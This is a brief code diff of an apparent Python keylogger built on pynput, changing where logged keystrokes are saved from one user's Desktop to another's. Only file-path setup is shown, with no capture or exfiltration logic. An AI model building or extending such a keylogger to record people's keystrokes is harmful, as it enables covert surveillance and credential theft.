@@ -2,7 +2,7 @@ import os
 from pynput import keyboard
 
 # File to store the logged keys
-log_file = "C:\\Users\\SOHEL\\Desktop\\data.txt"
+log_file = "C:\\Users\\Ritesh\\Desktop\\data.txt"
 
 # Ensure the directory exists
 os.makedirs(os.path.dirname(log_file), exist_ok=True)
